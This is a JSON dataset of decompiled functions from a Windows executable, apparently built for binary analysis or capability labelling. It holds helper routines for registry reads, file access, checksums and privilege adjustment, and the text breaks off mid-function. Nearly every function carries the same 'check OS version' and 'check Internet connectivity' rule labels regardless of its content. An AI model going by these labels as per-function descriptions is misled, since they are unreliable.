{
    "0040118c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004011a0)\n// WARNING: Removing unreachable block (ram,0x004011ad)\n// WARNING: Removing unreachable block (ram,0x004011b4)\n// WARNING: Removing unreachable block (ram,0x004011ba)\n// WARNING: Removing unreachable block (ram,0x004011c4)\n// WARNING: Removing unreachable block (ram,0x004011c7)\n// WARNING: Removing unreachable block (ram,0x004011e5)\n// WARNING: Removing unreachable block (ram,0x004011ec)\n// WARNING: Removing unreachable block (ram,0x004011f2)\n// WARNING: Removing unreachable block (ram,0x004011f9)\n// WARNING: Removing unreachable block (ram,0x00401203)\n\nuint __cdecl fcn.0040118c(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    uint in_EAX;\n    uint var_8h;\n    uint var_ch;\n    uint var_4h;\n    \n    return in_EAX;\n}\n",
        "token_count": 235
    },
    "0040133e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040133e(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    if (*arg_14h == 0) {\n        return;\n    }\n    uVar1 = fcn.00401133(arg_8h, arg_ch, arg_10h);\n    *arg_14h = *arg_14h & uVar1;\n    return;\n}\n",
        "token_count": 108
    },
    "00401364": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401364(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    fcn.0040133e(arg_8h, &var_4h, 4, arg_ch);\n    if (*arg_ch == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = var_4h >> 0x18 | (var_4h & 0xff0000) >> 8 | (var_4h & 0xff00) << 8 | var_4h << 0x18;\n    }\n    return uVar1;\n}\n",
        "token_count": 157
    },
    "00401390": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00401390(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_2h;\n    \n    fcn.0040133e(arg_8h, &var_2h, 2, arg_ch);\n    if (*arg_ch == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = var_2h << 8 | var_2h >> 8;\n    }\n    return uVar1;\n}\n",
        "token_count": 146
    },
    "004013bd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.004013bd(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint var_1h;\n    \n    fcn.0040133e(arg_8h, &var_1h, 1, arg_ch);\n    if (*arg_ch == 0) {\n        var_1h._0_1_ = 0;\n    }\n    return var_1h;\n}\n",
        "token_count": 117
    },
    "004013e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004013e8(uint arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    \n    if (*arg_10h == 0) {\n        return;\n    }\n    iVar1 = fcn.004010c2(arg_8h, arg_ch);\n    if (iVar1 == 0) {\n        *arg_10h = 0;\n    }\n    else {\n        fcn.00401047(arg_8h, arg_ch, 1);\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00401422": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401422(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    while( true ) {\n        iVar1 = fcn.00410664();\n        if ((iVar1 == 0) || (var_4h == 0)) break;\n        arg_10h = arg_10h - var_4h;\n        if (arg_10h == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 127
    },
    "00401463": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401463(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_88h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar2 = 0;\n    var_4h = fcn.00410652(arg_ch, 0xc0000000, 3, 0, 2, 0, 0);\n    if (var_4h != -1) {\n        fcn.004012bb(arg_8h);\n        do {\n            var_8h = 0;\n            (**(*arg_8h + 0xc))(arg_8h, &var_88h, 0x80, &var_8h);\n            if (var_8h == 0) {\n                uVar2 = 1;\n                break;\n            }\n            iVar1 = fcn.00401422(var_4h, &var_88h, var_8h);\n        } while (iVar1 != 0);\n        fcn.0041065e(var_4h);\n    }\n    return uVar2;\n}\n",
        "token_count": 261
    },
    "0040157e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040157e(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    if ((arg_ch != 0) && (arg_10h != 0)) {\n        fcn.0040118c(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0040159f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040159f(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    fcn.00401569(arg_8h, arg_10h);\n    if ((arg_10h != 0) && (arg_ch != 0)) {\n        fcn.0040157e(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "004015cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004015cb(uint arg_8h, int32_t arg_ch)\n\n{\n    uint arg_10h;\n    \n    if (arg_ch == 0) {\n        arg_10h = 0;\n    }\n    else {\n        arg_10h = fcn.0041066a(arg_ch);\n    }\n    fcn.0040159f(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 98
    },
    "004016db": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004016db(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    iVar1 = fcn.00410790(arg_8h, &var_4h);\n    if (iVar1 < 0) {\n        return 0;\n    }\n    var_8h = fcn.00401082(arg_8h);\n    if (3 < var_8h) {\n        var_8h = var_8h - 4;\n        iVar1 = fcn.00410670(var_4h);\n        if (iVar1 != 0) {\n            uVar2 = fcn.00401dc6(0, iVar1, var_8h);\n            var_ch = ~(uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | uVar2 << 0x18);\n            fcn.00410676(var_4h);\n        }\n        fcn.00401047(arg_8h, 0xfffffffc, 2);\n        var_10h = 1;\n        uVar2 = fcn.00401364(arg_8h, &var_10h);\n        if (var_10h == 0) {\n            uVar3 = 0;\n        }\n        else if ((uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | uVar2 << 0x18) == var_ch) {\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n        return uVar3;\n    }\n    fcn.0040129a(arg_8h);\n    return 0;\n}\n",
        "token_count": 451
    },
    "004018b8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004018b8(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.0041067c(arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 53
    },
    "00401c8d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401c8d(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t arg_8h_00;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    arg_8h_00 = 0;\n    if (arg_18h == 1) {\n        uVar2 = 0x200;\n    }\n    else if (arg_18h == 2) {\n        uVar2 = 0x100;\n    }\n    else {\n        uVar2 = 0;\n    }\n    iVar1 = fcn.004107b4(arg_8h, arg_ch, 0, uVar2 | 0x20019, &var_4h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.004107ba(var_4h, arg_10h, 0, &var_ch, 0, &var_8h);\n        if (((iVar1 == 0) && (var_8h != 0)) && ((var_ch != 1 || (var_8h != 1)))) {\n            arg_8h_00 = fcn.004018cf(var_8h + 1);\n            iVar1 = fcn.004107ba(var_4h, arg_10h, 0, 0, arg_8h_00, &var_8h);\n            if (iVar1 == 0) {\n                if (arg_14h != NULL) {\n                    *arg_14h = var_8h;\n                }\n            }\n            else {\n                fcn.004018b8(arg_8h_00);\n                arg_8h_00 = 0;\n            }\n        }\n        fcn.004107c0(var_4h);\n    }\n    if ((arg_8h_00 == 0) && (arg_18h < 2)) {\n        fcn.00401c8d(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h + 1);\n    }\n    return;\n}\n",
        "token_count": 524
    },
    "00401df8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401df8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0x414847;\n    }\n    if (arg_ch == 0) {\n        arg_ch = 0x414847;\n    }\n    iVar1 = fcn.0041066a(arg_8h);\n    iVar2 = fcn.0041066a(arg_ch);\n    uVar3 = fcn.004018cf(iVar1 + iVar2 + 1);\n    fcn.0041068e(uVar3, arg_8h);\n    fcn.00410694(uVar3, arg_ch);\n    return uVar3;\n}\n",
        "token_count": 184
    },
    "00401e4c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401e4c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0x414847;\n    }\n    if (arg_ch == 0) {\n        arg_ch = 0x414847;\n    }\n    iVar1 = fcn.0041066a(arg_8h);\n    iVar2 = fcn.0041066a(arg_ch);\n    uVar3 = fcn.004018cf(iVar1 + iVar2 + 1);\n    fcn.0041068e(uVar3, arg_8h);\n    fcn.00410694(uVar3, arg_ch);\n    if (arg_8h != 0x414847) {\n        fcn.004018b8(arg_8h);\n    }\n    return uVar3;\n}\n",
        "token_count": 215
    },
    "00401eb1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401eb1(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.004018cf(0x105);\n    if ((*0x414b7d == NULL) || (iVar2 = (**0x414b7d)(0, arg_8h, 0, 0, arg_8h_00),  iVar2 < 0)) {\n        fcn.004018b8(arg_8h_00);\n        var_4h = 0;\n        piVar3 = 0x414b81;\n        while ((arg_8h_00 = var_4h,  *piVar3 != 0 &&\n               ((puVar1 = *piVar3,  puVar1[1] != (arg_8h & 0xffff7fff) ||\n                (arg_8h_00 = fcn.00401d71(*puVar1, \n                                          \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders\", \n                                          puVar1 + 2, 0),  arg_8h_00 == 0))))) {\n            piVar3 = piVar3 + 1;\n        }\n    }\n    var_4h = arg_8h_00;\n    return var_4h;\n}\n",
        "token_count": 331
    },
    "00401f36": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401f36(char *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        iVar1 = fcn.00410652(arg_8h, 0x80, 0, 0, 3, 0, 0);\n        iVar1 = iVar1 + 1;\n        if (iVar1 != 0) {\n            fcn.0041065e(iVar1);\n        }\n        return iVar1 != 0;\n    }\n    return false;\n}\n",
        "token_count": 132
    },
    "00401f7e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401f7e(char *arg_8h)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    \n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        uVar1 = fcn.0041069a(arg_8h);\n        if (uVar1 == 0xffffffff) {\n            bVar2 = false;\n        }\n        else {\n            bVar2 = (uVar1 & 0x10) != 0;\n        }\n        return bVar2;\n    }\n    return false;\n}\n",
        "token_count": 131
    },
    "004020b9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004020b9(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint arg_10h;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint arg_8h;\n    uint arg_ch;\n    uint var_1020h;\n    uint var_101ch;\n    uint32_t var_1018h;\n    uint var_1014h;\n    uint var_1010h;\n    int32_t var_100ch;\n    uint var_1008h;\n    uint var_1004h;\n    uint var_4h;\n    \n    if (*0x4147ed != NULL) {\n        fcn.004018b8(*0x4147ed);\n        *0x4147ed = NULL;\n    }\n    if (*0x4147f1 != NULL) {\n        fcn.004018b8(*0x4147f1);\n        *0x4147f1 = NULL;\n    }\n    fcn.00401000(&var_1010h);\n    fcn.00401000(&var_1014h);\n    iVar1 = fcn.004107c6(0x80000002, \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\", &var_4h);\n    if (iVar1 == 0) {\n        var_100ch = 0;\n        while( true ) {\n            var_1008h = 0xfff;\n            iVar1 = fcn.004107cc(var_4h, var_100ch, &var_1004h, &var_1008h, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            iVar1 = fcn.00401df8(\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\", 0x414845);\n            if ((iVar1 != 0) && (iVar1 = fcn.00401e4c(iVar1, &var_1004h),  iVar1 != 0)) {\n                uVar2 = fcn.00401d71(0x80000002, iVar1, \"UninstallString\", &var_1018h);\n                if ((uVar2 != 0) && (1 < uVar2)) {\n                    fcn.0040157e(var_1010h, uVar2, var_1018h);\n                    iVar3 = fcn.00401d71(0x80000002, iVar1, \"DisplayName\", &var_1018h);\n                    if ((iVar3 == 0) || (var_1018h < 2)) {\n                        iVar3 = fcn.0041066a(&var_1004h);\n                        arg_10h = var_1014h;\n                        fcn.0040157e(var_1014h, &var_1004h, iVar3 + 1);\n                    }\n                    else {\n                        arg_10h = fcn.0041066a(&var_1004h, iVar3, iVar3);\n                        arg_ch = var_1014h;\n                        fcn.0040157e(var_1014h, &var_1004h, arg_10h);\n                        arg_8h = var_1014h;\n                        fcn.0040157e(var_1014h, arg_ch, var_1018h);\n                        fcn.004018b8(arg_8h);\n                    }\n                    fcn.004018b8(arg_10h);\n                }\n                fcn.004018b8(iVar1);\n            }\n            var_100ch = var_100ch + 1;\n        }\n        fcn.004107c0();\n    }\n    fcn.00401569(var_1010h, 0);\n    fcn.00401569(var_1014h, 0);\n    iVar1 = fcn.00410790(var_1010h, &var_101ch);\n    if (-1 < iVar1) {\n        var_1018h = fcn.00401082(var_1010h);\n        *0x4147ed = fcn.004018cf(var_1018h);\n        puVar4 = fcn.00410670(var_101ch);\n        uVar2 = var_1018h;\n        puVar5 = *0x4147ed;\n        if (puVar4 != NULL) {\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar5 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            fcn.00410676(var_101ch);\n        }\n    }\n    iVar1 = fcn.00410790(var_1014h, &var_101ch);\n    if (-1 < iVar1) {\n        var_1018h = fcn.00401082(var_1014h);\n        *0x4147f1 = fcn.004018cf(var_1018h);\n        puVar4 = fcn.00410670(var_101ch);\n        uVar2 = var_1018h;\n        puVar5 = *0x4147f1;\n        if (puVar4 != NULL) {\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar5 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            fcn.00410676(var_101ch);\n        }\n    }\n    fcn.00401021(var_1010h);\n    fcn.00401021(var_1014h);\n    return;\n}\n",
        "token_count": 1262
    },
    "004023a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004023a8(int32_t arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    if (arg_8h == 0) {\n        var_4h = 0;\n        puVar1 = *0x41484b;\n    }\n    else {\n        var_4h = fcn.00401dc6(0, arg_8h, arg_ch);\n        puVar1 = *0x41484b;\n    }\n    do {\n        if (puVar1 == NULL) {\ncode_r0x004023f4:\n            if (var_8h == 0) {\n                fcn.00402384(var_4h);\n            }\n            return var_8h;\n        }\n        if (var_4h == puVar1[1]) {\n            var_8h = 1;\n            goto code_r0x004023f4;\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 248
    },
    "0040242b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.0040242b(uint arg_8h)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    \n    pcVar2 = fcn.00401df8(arg_8h, 0);\n    uVar3 = fcn.0041066a(arg_8h);\n    if ((1 < uVar3) && (pcVar6 = pcVar2,  pcVar1 = pcVar2,  *pcVar2 == '\\\"')) {\n        for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *pcVar6 = pcVar1[1];\n            pcVar6 = pcVar6 + 1;\n            pcVar1 = pcVar1 + 1;\n        }\n    }\n    iVar4 = fcn.00410808(pcVar2, \".exe\");\n    if (iVar4 != 0) {\n        *(iVar4 + 4) = 0;\n    }\n    puVar5 = fcn.0041080e(pcVar2, 0, 0x5c);\n    if (puVar5 == NULL) {\n        *pcVar2 = '\\0';\n    }\n    else {\n        *puVar5 = 0;\n    }\n    uVar3 = fcn.0041066a(pcVar2);\n    if (uVar3 < 4) {\n        *pcVar2 = '\\0';\n    }\n    return pcVar2;\n}\n",
        "token_count": 345
    },
    "004024d6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004024d6(char *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    \n    iVar2 = fcn.004106be(arg_8h);\n    if (iVar2 == 0) {\n        return iVar2;\n    }\n    do {\n        iVar2 = -1;\n        pcVar3 = arg_8h;\n        do {\n            arg_8h = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            arg_8h = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = arg_8h;\n        } while (cVar1 != '\\0');\n        if (*arg_8h == '\\0') {\n            return 1;\n        }\n        iVar2 = fcn.004106c4();\n        if (iVar2 == 0) {\n            return iVar2;\n        }\n        *arg_ch = iVar2;\n        arg_ch = arg_ch + 1;\n    } while( true );\n}\n",
        "token_count": 252
    },
    "004025a9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004025a9(char *arg_8h)\n\n{\n    uint uVar1;\n    \n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        uVar1 = 0;\n        for (; *arg_8h != '\\0'; arg_8h = arg_8h + 1) {\n            if ((*arg_8h == '\\\\') || (*arg_8h == '/')) {\n                uVar1 = 1;\n            }\n            else {\n                uVar1 = 0;\n            }\n        }\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 140
    },
    "004027f7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004027f7(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t arg_ch_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint in_stack_fffffe8c;\n    uint var_111h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.00401d71(*0x414869, \"Software\\\\WinRAR\", arg_8h, arg_ch);\n    if (arg_ch_00 == 0) {\n        arg_ch_00 = 0;\n        uVar1 = fcn.004106ca(0x104, &var_111h);\n        if ((uVar1 != 0) && (uVar1 < 0x105)) {\n            fcn.00401000(&var_4h);\n            iVar2 = fcn.004025a9(&var_111h);\n            if (iVar2 == 0) {\n                uVar3 = fcn.00401df8(&var_111h, 0x414845);\n                uVar3 = fcn.00401e4c(uVar3, arg_8h);\n            }\n            else {\n                uVar3 = fcn.00401df8(&var_111h, arg_8h);\n            }\n            iVar2 = fcn.0040120d(uVar3, var_4h, uVar3);\n            if ((((iVar2 != 0) && (var_8h = fcn.00401082(var_4h),  var_8h != 0)) &&\n                (iVar2 = fcn.00410790(var_4h, &var_ch),  -1 < iVar2)) && (iVar2 = fcn.00410670(var_ch),  iVar2 != 0)) {\n                iVar2 = var_8h;\n                arg_ch_00 = fcn.004018cf(var_8h);\n                fcn.00401906(iVar2, arg_ch_00, var_8h);\n                fcn.00410676();\n                *arg_ch = var_8h;\n                in_stack_fffffe8c = var_ch;\n            }\n            fcn.004018b8(in_stack_fffffe8c);\n            fcn.00401021(var_4h);\n        }\n    }\n    return arg_ch_00;\n}\n",
        "token_count": 539
    },
    "004028fe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004028fe(char *arg_8h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    \n    while ((((pcVar2 = arg_8h,  *arg_8h == ' ' || (*arg_8h == '\\r')) || (*arg_8h == '\\n')) || (*arg_8h == '\\t'))) {\n        for (; *pcVar2 != '\\0'; pcVar2 = pcVar2 + 1) {\n            *pcVar2 = pcVar2[1];\n        }\n    }\n    while ((iVar1 = fcn.0041066a(),  iVar1 != 0 &&\n           (((arg_8h[iVar1 + -1] == ' ' || (arg_8h[iVar1 + -1] == '\\r')) ||\n            ((arg_8h[iVar1 + -1] == '\\n' || (arg_8h[iVar1 + -1] == '\\t'))))))) {\n        arg_8h[iVar1 + -1] = '\\0';\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "00402968": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402968(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*0x414b3b != NULL) && (*0x414b3f != NULL)) && (*0x414b27 != NULL)) {\n        uVar3 = 0;\n        var_ch = 0;\n        iVar1 = (**0x414b3b)(0, arg_8h, &var_8h);\n        if (iVar1 != 0) {\n            uVar2 = fcn.004106dc();\n            iVar1 = (**0x414b27)(uVar2, 0x20, &var_ch);\n            if (iVar1 != 0) {\n                var_1ch = 1;\n                var_18h = var_8h;\n                var_14h = var_4h;\n                if (arg_ch == 0) {\n                    var_10h = 0;\n                }\n                else {\n                    var_10h = 2;\n                }\n            }\n            iVar1 = (**0x414b3f)(var_ch, 0, &var_1ch, 0x10, 0, 0);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n        if (var_ch != 0) {\n            fcn.0041065e(var_ch);\n        }\n        return uVar3;\n    }\n    return 